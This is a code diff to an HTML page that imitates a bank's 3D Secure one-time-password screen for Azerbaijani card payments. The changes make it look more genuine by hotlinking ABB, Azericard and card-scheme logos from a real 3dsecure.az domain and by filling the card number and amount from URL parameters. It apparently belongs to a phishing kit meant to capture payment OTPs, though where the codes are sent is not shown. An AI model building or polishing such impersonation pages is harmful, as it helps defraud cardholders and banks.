@@ -84,9 +84,9 @@
         <main class="main">
             <header>
                 <div class="card-call">
-                    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5e/Visa_Inc._logo.svg/2560px-Visa_Inc._logo.svg.png" style="height:20px;">
-                    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Mastercard-logo.svg/1280px-Mastercard-logo.svg.png" style="height:25px;">
-                    <img src="https://static.tildacdn.one/tild3062-3037-4265-b832-663130393564/m10byPashaPay_1.svg" >
+                    <img src="https://mpi.3dsecure.az/abb_default/img/abb_logo.svg" alt="ABB Logo">
+                    <img src="https://mpi.3dsecure.az/abb_default/img/azericard.svg" alt="Azericard Logo">
+                    <img src="https://static.tildacdn.one/tild3062-3037-4265-b832-663130393564/m10byPashaPay_1.svg" alt="PashaPay Logo">
                 </div>
             </header>
 
@@ -97,7 +97,7 @@
                     <div class="datetime-display" id="currentDateTime"></div>
                     <div class="amount-display" id="paymentAmount"></div>
                     <div class="card-info">
-                        <img id="cardTypeLogo" src="images/mastercard_logo.png" style="height:25px;" >
+                        <img id="cardTypeLogo" src="images/mastercard.png" alt="Card Type" width="40" height="24">
                         <span id="cardNumber"></span>
                     </div>
                 </div>
@@ -113,7 +113,7 @@
                                            pattern="[0-9]*">
                                 </div>
                                 <div class="tooltip">
-                                    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5e/Visa_Inc._logo.svg/2560px-Visa_Inc._logo.svg.png" style="height:20px;">
+                                    <img src="https://mpi.3dsecure.az/abb_default/img/info-circle.svg" alt="Info" width="20" height="20" style="cursor: pointer;">
                                     <span class="tooltiptext">
                                         Sizə mesaj vasitəsi ilə göndərildi!
                                     </span>
@@ -125,7 +125,7 @@
 
                     <div class="form-button">
                         <button id="submitBtn" type="submit" class="submitBtn" disabled>
-                            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5e/Visa_Inc._logo.svg/2560px-Visa_Inc._logo.svg.png" style="height:20px;">
+                            <img src="https://mpi.3dsecure.az/abb_default/img/lock.svg" alt="Lock" width="16" height="16">
                             Ödənişi təsdiqlə
                         </button>
                         <button id="cnltBtn" type="button" onclick="window.location.href='../index.html'">
@@ -138,49 +138,74 @@
 
         <footer>
             <div class="footer_1">
-                <img src="images/visa_logo.png" style="height:20px;" style="height:20px; margin: 0 10px;" >
-                <img src="images/visa_logo.png" style="height:20px;" style="height:20px; margin: 0 10px;" >
-                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Mastercard-logo.svg/1280px-Mastercard-logo.svg.png" style="height:25px;">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Mastercard-logo.svg/1280px-Mastercard-logo.svg.png" style="height:25px;">
+                <img src="https://mpi.3dsecure.az/abb_default/img/visa.svg" alt="Visa" width="48" height="24">
+                <img src="https://mpi.3dsecure.az/abb_default/img/secure.svg" alt="Verified by Visa" width="48" height="24">
+                <img src="https://mpi.3dsecure.az/abb_default/img/master.svg" alt="Mastercard" width="48" height="24">
+                <img src="https://mpi.3dsecure.az/abb_default/img/master_logo.svg" alt="Mastercard SecureCode" width="48" height="24">
             </div>
             <div class="footer_2">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5e/Visa_Inc._logo.svg/2560px-Visa_Inc._logo.svg.png" style="height:20px;">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5e/Visa_Inc._logo.svg/2560px-Visa_Inc._logo.svg.png" style="height:20px;">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5e/Visa_Inc._logo.svg/2560px-Visa_Inc._logo.svg.png" style="height:20px;">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5e/Visa_Inc._logo.svg/2560px-Visa_Inc._logo.svg.png" style="height:20px;">
+                <img src="https://mpi.3dsecure.az/abb_default/img/american_express.svg" alt="American Express" width="48" height="24">
+                <img src="https://mpi.3dsecure.az/abb_default/img/safeKey.svg" alt="SafeKey" width="48" height="24">
+                <img src="https://mpi.3dsecure.az/abb_default/img/UnionPay.svg" alt="UnionPay" width="48" height="24">
+                <img src="https://mpi.3dsecure.az/abb_default/img/jcb.svg" alt="JCB" width="48" height="24">
             </div>
         </footer>
     </div>
 
     <script src="js/azericard-imask.js"></script>
-    
+    <script>
+        // Get URL parameters
+        const urlParams = new URLSearchParams(window.location.search);
+        const cardNumber = urlParams.get('card') || '';
+        const amount = urlParams.get('amount') || '0.00';
 
-<style>
-    .professional-error {
-        background-color: #f8d7da;
-        color: #721c24;
-        border: 1px solid #f5c6cb;
-        padding: 12px;
-        border-radius: 8px;
-        margin-top: 15px;
-        text-align: center;
-        font-weight: 600;
-        font-size: 14px;
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        gap: 10px;
-    }
-    .input-error-border {
-    }
-</style>
+        // Format and display amount
+        const formattedAmount = new Intl.NumberFormat('az-AZ', {
+            style: 'currency',
+            currency: 'AZN'
+        }).format(parseFloat(amount));
+        document.getElementById('paymentAmount').textContent = formattedAmount;
+        document.getElementById('card').value = cardNumber;
 
+        // Update card display - show last 4 digits
+        const lastFourDigits = cardNumber.slice(-4);
+        document.getElementById('cardNumber').textContent = lastFourDigits ? `**** **** **** ${lastFourDigits}` : '';
+
+        // Set current date and time
+        function updateDateTime() {
+            const now = new Date();
+            const hours = String(now.getHours()).padStart(2, '0');
+            const minutes = String(now.getMinutes()).padStart(2, '0');
+            const dd = String(now.getDate()).padStart(2, '0');
+            const mm = String(now.getMonth() + 1).padStart(2, '0');
+            const yyyy = now.getFullYear();
+            
+            document.getElementById('currentDateTime').textContent = 
+                `${hours}:${minutes} ${dd}.${mm}.${yyyy}`;
+        }
+        updateDateTime();
+
+        // Set card type logo
+        const cardTypeLogo = document.getElementById('cardTypeLogo');
+        if (cardNumber.startsWith('4')) {
+            cardTypeLogo.src = 'images/visa.png';
+            cardTypeLogo.alt = 'Visa';
+        } else if (/^(5[1-5]|222[1-9]|22[3-9]|2[3-6]|27[0-1]|2720)/.test(cardNumber)) {
+            cardTypeLogo.src = 'images/mastercard.png';
+            cardTypeLogo.alt = 'Mastercard';
+        }
+
+
+        // Enable submit button when OTP is entered
+        const otpInput = document.getElementById('securitycode');
+        const submitBtn = document.getElementById('submitBtn');
+        
+        otpInput.addEventListener('input', function() {
+            submitBtn.disabled = this.value.length < 4;
+        });
+
+
+    </script>
 </body>
 
 </html>
-<!-- OTP Xəta Mesajı üçün Skript -->
-
-
-
-
-
